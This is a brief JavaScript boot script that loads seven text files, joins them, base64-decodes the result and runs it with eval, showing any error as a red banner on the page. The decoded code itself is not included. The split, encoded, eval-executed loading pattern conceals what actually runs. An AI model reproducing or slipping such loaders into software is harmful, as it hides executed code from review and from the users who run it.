/* v1.0 boot */
(async()=>{
const _p=[];
_p.push(await (await fetch("./ldr0.txt?v=18")).text());
_p.push(await (await fetch("./ldr1.txt?v=18")).text());
_p.push(await (await fetch("./ldr2.txt?v=18")).text());
_p.push(await (await fetch("./ldr3.txt?v=18")).text());
_p.push(await (await fetch("./ldr4.txt?v=18")).text());
_p.push(await (await fetch("./ldr5.txt?v=18")).text());
_p.push(await (await fetch("./ldr6.txt?v=18")).text());
eval(atob(_p.join('')));
})().catch(e=>{console.error(e);document.body.insertAdjacentHTML('afterbegin','<div style="padding:12px;background:#3a1820;color:#faa">'+e.message+'</div>');});
